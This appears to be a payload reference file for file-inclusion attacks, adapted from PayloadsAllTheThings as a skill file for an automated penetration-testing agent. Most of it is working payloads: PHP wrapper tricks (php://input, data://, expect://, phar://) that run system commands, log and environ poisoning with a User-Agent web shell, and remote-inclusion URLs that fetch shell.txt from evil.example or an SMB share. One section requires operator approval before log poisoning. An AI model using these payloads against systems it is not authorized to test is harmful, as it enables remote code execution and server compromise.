---
description: PHP wrappers, log/environ/session poisoning, RFI, LFI-to-RCE chains (traversal sequences and interesting files are in directory-traversal-payloads.md)
skill: file-inclusion
source: PayloadsAllTheThings — File Inclusion
source_revision: 3ac27901c711bdf3f5b65a7b1d1820a1f65bd09a
source_license: MIT; see THIRD_PARTY_NOTICES.md
---

# File Inclusion (LFI/RFI) Payloads

> Notation: `PAYLOAD: php <code>` stands for `<code>` wrapped in a PHP open/close tag; expand it when building the request.

> Source: PayloadsAllTheThings — File Inclusion

Traversal sequences, encodings, null byte, truncation and interesting files per OS: `directory-traversal-payloads.md`.

## PHP Wrapper Techniques

### php://filter (Source Code Disclosure)

```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
```

### php://input (POST Data as File)

```
POST /vuln.php?page=php://input HTTP/1.1
Content-Type: text/plain

PAYLOAD: php system('id')
```

### data:// (Inline Code Execution)

```
data://text/plain;base64,BASE64_ENCODED_PHP_SYSTEM_CALL
data://text/plain,PAYLOAD: php system('id')
```

### expect:// (Command Execution)

```
expect://id
expect://ls
```

Requires `expect` extension to be loaded.

### zip:// and phar://

```
# Upload a ZIP containing a PHP file, then include it
zip://uploads/evil.zip%23shell.php
phar://uploads/evil.phar/shell.php
```

## Log Poisoning

Writing to a log or mail spool is a persistent change to the target, and one PHP parse error in
the poisoned file can break that include for good. Use it only with operator approval
(`agent/shared-constraints.md` §1), with a single benign `id` payload; prefer the no-write
filter chain below. Poisoning your own session file changes only your own test data and needs no
approval.

### Apache Access Log

```bash
# Step 1: Poison the log via User-Agent
curl -A "PAYLOAD: php system($_GET['cmd'])" http://target.example/

# Step 2: Include the log file
http://target.example/vuln.php?page=/var/log/apache2/access.log&cmd=id

# XAMPP on Windows
C:\xampp\apache\logs\access.log
```

### /proc/self/environ

```
http://target.example/vuln.php?page=/proc/self/environ
```

Poison via `User-Agent` header containing PHP code.

## Remote File Inclusion (RFI)

```
http://target.example/vuln.php?page=http://evil.example/shell.txt
http://target.example/vuln.php?page=http://evil.example/shell.txt%00
http://target.example/vuln.php?page=http:%252f%252fevil.example%252fshell.txt

# SMB share (Windows — bypasses allow_url_include)
http://target.example/vuln.php?page=\\10.0.0.1\share\shell.php
```

## LFI to RCE Chains

```
1. LFI + Log Poisoning         -> RCE via log file inclusion
2. LFI + /proc/self/environ    -> RCE via User-Agent injection
3. LFI + php://input           -> RCE via POST body
4. LFI + data://               -> RCE via inline PHP
5. LFI + PHP session files     -> RCE via session poisoning
   /tmp/sess_[SESSIONID] or /var/lib/php/sessions/sess_[SESSIONID]
6. LFI + Upload                -> RCE via uploaded file inclusion
7. LFI + phar://               -> RCE via deserialization
8. LFI + php://filter chain    -> RCE with no file write (synacktiv
   php_filter_chain_generator.py, run host-side; deliver the output as the parameter)
```

RFI payload files (`shell.txt` above) must be served by an operator-provisioned listener
(`$DIR/.listener_url`); the interactsh OOB host records requests but serves nothing.
